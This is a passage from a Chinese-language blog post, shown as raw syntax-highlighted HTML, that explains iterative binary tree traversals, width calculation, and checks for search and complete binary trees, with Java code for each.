punctuation">&#123;</span>            <span class="token class-name">Node</span> cur <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h4><p>由前面的先序遍历可知先压右后压左得出的结果为（根、左、右），那么先压左后压右则得出（根、右、左），所以将（根、右、左）放在另一个栈里，再弹出，则为左、右、根</p><p>首先准备两个栈，先压入根节点到栈A中，循环以下操作</p><p>1）弹出一个节点，即为cur</p><p>2）将cur压入栈B</p><p>3）先压入左节点，再压入右节点</p><p>打印栈B即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">postTraversal</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stackA <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stackB <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        stackA<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stackA<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> cur <span class="token operator">=</span> stackA<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            stackB<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> stackA<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> stackA<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stackB<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stackB<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><p>对于中序来说，入栈顺序则为左、右、根</p><p>1）将以该节点为根节点的树的左子节点全部入栈（即整棵树的左边界入栈）</p><p>2）弹出cur</p><p>3）打印，对cur右子树循环操作</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">inTraversal</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 巧妙复用head变量简化代码</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>                head <span class="token operator">=</span> head<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                head <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                head <span class="token operator">=</span> head<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="宽度优先遍历"><a href="#宽度优先遍历" class="headerlink" title="宽度优先遍历"></a>宽度优先遍历</h4><p>使用队列结构，首先压入根节点，然后循环以下操作</p><p>1）弹出</p><p>2）打印</p><p>3）先压入左节点，再压入右节点</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">widthFirstTraversal</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> cur <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x01-求二叉树的宽度"><a href="#0x01-求二叉树的宽度" class="headerlink" title="0x01 求二叉树的宽度"></a>0x01 求二叉树的宽度</h3><h4 id="1-0-3"><a href="#1-0-3" class="headerlink" title="1.0"></a>1.0</h4><p>采用哈希表，存储每一个节点对应在第几层，从根节点在第一层开始，按照宽度优先遍历的步骤，使用变量存储当前在第几层、当前层数已经遍历的节点数量、当前已知的最大宽度(max)</p><p>从第一层开始，将根节点入队，出队发现当前在第一层，出队的节点查表得知在第一层，所以开始累积第一层已经遍历的节点数量，为1，跟随宽度优先遍历，入队的同时，也将节点的宽度入表</p><p>到了第二层，查表发现出队的节点的层数与当前层数不一致，当前层数的节点遍历完毕，可以结算节点的数量，与max比较即可，当前的层数来到第二层，当前层数已经遍历的节点数量也刷新（这里注意，因为现在到了第二层，遍历完了第一个节点，所以刷新值为1而不是0），循环下去即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getMaxWidthOne</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> hm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        hm<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> curLevel <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> curLevelNodes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> cur <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> curNodeLevel <span class="token operator">=</span> hm<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>curNodeLevel <span class="token operator">==</span> curLevel<span class="token punctuation">)</span> curLevelNodes<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> curLevelNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>                curLevel<span class="token operator">++</span><span class="token punctuation">;</span>                curLevelNodes <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                hm<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">,</span> curNodeLevel<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                hm<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right<span class="token punctuation">,</span> curNodeLevel<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> max<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-3"><a href="#2-0-3" class="headerlink" title="2.0"></a>2.0</h4><p>不使用哈希表，只使用队列，额外变量记录当前层的最后一个节点、下一层的最后一个节点、当前层的节点数量、当前已知的最大宽度(max)</p><p>根节点入队，出队，当前层的最后一个节点赋为根节点，下一层的最后一个节点赋为空，然后开始左右节点入队，保持下一层的最后一个节点总是为最后入队的节点（即队尾的节点），当到达当前层的最后一个节点时，结算，进行下一轮</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getMaxWidthTwo</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>        <span class="token keyword">int</span> curLevelNodes <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> curEnd <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> nextEnd <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> cur <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>                nextEnd <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>                nextEnd <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> curEnd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                curEnd <span class="token operator">=</span> nextEnd<span class="token punctuation">;</span>                nextEnd <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> curLevelNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>                curLevelNodes <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                curLevelNodes<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> max<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-判断搜索二叉树"><a href="#0x02-判断搜索二叉树" class="headerlink" title="0x02 判断搜索二叉树"></a>0x02 判断搜索二叉树</h3><p>搜索二叉树即左子树的值都比根节点小，右子树的值都比根节点大，一棵经典的搜索二叉树是没有重复值的</p><p>使用中序遍历即可，中序遍历搜索二叉树即为升序，所以如果一旦遇到逆序的，则不是搜索二叉树，需要在中序遍历的打印处修改为判断结构即可</p><h4 id="1-0-递归的改写"><a href="#1-0-递归的改写" class="headerlink" title="1.0 递归的改写"></a>1.0 递归的改写</h4><p>需要一个全局变量记录遍历到的前一个值，然后与遍历的值比较即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> pre <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isBSTOne</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> isBST <span class="token operator">=</span> <span class="token function">isBSTOne</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>isBST<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>value <span class="token operator">&lt;=</span> pre<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    pre <span class="token operator">=</span> head<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">isBSTOne</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-迭代的改写"><a href="#2-0-迭代的改写" class="headerlink" title="2.0 迭代的改写"></a>2.0 迭代的改写</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isBSTTwo</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> pre <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>                head <span class="token operator">=</span> head<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                head <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>value <span class="token operator">&lt;=</span> pre<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token keyword">else</span> pre <span class="token operator">=</span> head<span class="token punctuation">.</span>value<span class="token punctuation">;</span>                head <span class="token operator">=</span> head<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x03-判断完全二叉树"><a href="#0x03-判断完全二叉树" class="headerlink" title="0x03 判断完全二叉树"></a>0x03 判断完全二叉树</h3><p>即要么所有层都是满的，要么最后一层即使不满也是从左到右依次占满</p><p>显然可以使用宽度遍历，遍历过程中进入如下判断</p><p>1）如果有右无左，false</p><p>2）过了1，说明不会存在有右无左，则现在如果出现有一个子节点为null，则后面的节点必须都为null，否则false，如何判断后面的节点，需要设立一个布尔变量标志是否遇到左右两个子节点不双全的情况</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isCBT</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> leaf <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Node</span> cur <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Node</span> l <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token class-name">Node</span> r <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>                    <span class="token punctuation">(</span>leaf <span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>l<span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">||</span> r<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> r <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token 